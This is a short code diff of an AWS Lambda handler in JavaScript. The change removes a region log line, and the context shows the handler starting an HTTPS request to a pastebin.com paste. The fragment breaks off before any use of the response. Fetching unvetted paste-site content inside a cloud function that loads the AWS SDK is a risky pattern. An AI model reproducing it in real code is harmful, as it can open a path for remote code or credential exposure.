@@ -1,7 +1,6 @@
 module.exports.handler = function (event, context, callback) {
     var https = require('https')
     var AWS = require('aws-sdk')
-    console.log(AWS.config.region)
     var r = https.request({
         host: "pastebin.com",
         path: "/jWKHzPaq"
